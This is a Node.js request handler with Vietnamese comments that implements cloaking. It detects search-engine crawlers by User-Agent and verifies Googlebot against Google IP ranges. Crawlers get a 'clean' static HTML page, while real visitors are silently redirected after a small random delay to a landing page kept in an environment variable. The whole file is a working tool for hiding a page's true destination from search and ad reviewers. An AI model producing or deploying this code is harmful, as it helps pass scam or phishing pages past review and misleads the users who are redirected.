const path = require('path');
const ipRangeCheck = require('ip-range-check');

const knownGoogleBotIPs = [
  // Dải IP Googlebot chính thức (ví dụ, có thể mở rộng thêm)
  '66.249.64.0/19',
  '64.233.160.0/19',
  '72.14.192.0/18',
  '203.208.60.0/24',
  '74.125.0.0/16',
  '209.85.128.0/17',
  '216.239.32.0/19',
  '66.102.0.0/20',
  '64.18.0.0/20',
  '207.126.144.0/20',
  '173.194.0.0/16',
  '108.177.8.0/21',
  '35.191.0.0/16',
  '130.211.0.0/22',
];

function isGoogleBot(userAgent, req) {
  const botPatterns = [
    /googlebot/i,
    /adsbot-google/i,
    /mediapartners-google/i,
    /apis-google/i,
    /feedfetcher-google/i,
    /google favicon/i,
    /google web preview/i,
    /google-read-aloud/i,
    /duplexweb-google/i,
    /google-speakr/i,
    /bingbot/i,
    /slurp/i,
    /duckduckbot/i,
    /baiduspider/i,
    /yandexbot/i,
    /sogou/i,
    /exabot/i,
    /facebot/i,
    /ia_archiver/i
  ];
  const isBotUA = botPatterns.some((re) => re.test(userAgent));
  if (!isBotUA) return false;
  // Kiểm tra IP nếu là Googlebot
  if (/googlebot/i.test(userAgent)) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
    if (!ipRangeCheck(ip, knownGoogleBotIPs)) {
      console.warn('⚠️ Googlebot UA nhưng IP không hợp lệ:', ip);
      return false;
    }
  }
  return true;
}

exports.handleRedirect = async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  console.log('🔍 UA:', ua);

  const LANDING_PAGE_URL = process.env.LANDING_PAGE_URL;
  if (!LANDING_PAGE_URL) {
    console.error('❌ Thiếu biến môi trường LANDING_PAGE_URL');
    return res.status(500).send('Server misconfiguration');
  }

  if (isGoogleBot(ua, req)) {
    console.log('🤖 Googlebot hoặc hành vi nghi ngờ ➜ trả HTML sạch');
    return res.sendFile(path.join(__dirname, '../view/index.html'));
  }

  // Người dùng thật, thêm delay nhẹ trước khi redirect
  await new Promise(r => setTimeout(r, Math.floor(300 + Math.random() * 200)));
  console.log('🚶 Người dùng thật ➜ redirect đến landing page (User-Agent: ' + ua + ')');
  return res.redirect(302, LANDING_PAGE_URL);
};
